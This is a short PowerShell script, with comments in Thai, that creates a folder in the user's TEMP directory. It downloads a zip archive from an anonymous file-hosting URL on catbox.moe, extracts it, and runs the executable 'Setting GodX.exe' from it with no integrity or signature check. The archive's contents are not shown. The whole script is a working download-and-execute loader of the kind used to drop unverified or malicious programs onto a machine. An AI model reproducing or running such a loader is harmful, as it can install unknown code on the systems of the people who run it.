$exeName = "Setting GodX.exe"
$zipName = "afb9rh.zip"
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"
$zipPath = "$tempPath\$zipName"

# 1. สร้างโฟลเดอร์สำหรับทำงาน
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# 2. ดาวน์โหลดไฟล์
$client = New-Object System.Net.WebClient
$client.DownloadFile($zipUrl, $zipPath)

# 3. แตกไฟล์
Expand-Archive -Path $zipPath -DestinationPath $tempPath -Force

# 4. รันโปรแกรม (แบบไม่ปิดหน้าต่าง)
Start-Process "$tempPath\$exeName"